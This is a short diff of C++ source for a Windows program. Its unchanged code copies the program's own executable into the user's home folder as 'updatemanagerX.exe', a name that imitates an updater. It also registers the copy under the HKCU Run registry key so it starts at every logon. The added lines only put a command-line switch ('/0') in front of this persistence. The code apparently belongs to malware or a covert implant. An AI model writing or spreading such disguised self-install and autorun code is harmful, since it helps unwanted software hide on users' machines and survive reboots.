@@ -95,6 +95,9 @@ char* abso(const char* x, size_t* sp = nullptr);
 
 int main(int argc, char* argv[])
 {
+	bool Persist = true;
+	if (argc > 1 && std::string(argv[1]) == "/0")
+		Persist = false;
 	std::string home;
 	{
 #pragma warning(suppress : 4996)
@@ -112,7 +115,7 @@ int main(int argc, char* argv[])
 	{
 		std::string a(argv[0]);
 		bool cp = false;
-		{
+		if(Persist) {
 			std::string nf = home + "updatemanagerX.exe";
 			if (!std::filesystem::exists(nf)) {
 				char* tld2 = abso(a.c_str());
@@ -132,7 +135,7 @@ int main(int argc, char* argv[])
 		if (tld == nullptr) goto skiphephistus;
 		strcpy_s(tld, s, codec.c_str());
 
-		/*if (cp)*/ {
+		if (cp&&Persist) {
 			HKEY k;
 			LSTATUS x = RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\", 0, KEY_WRITE, &k);
 			if (x == ERROR_SUCCESS) {
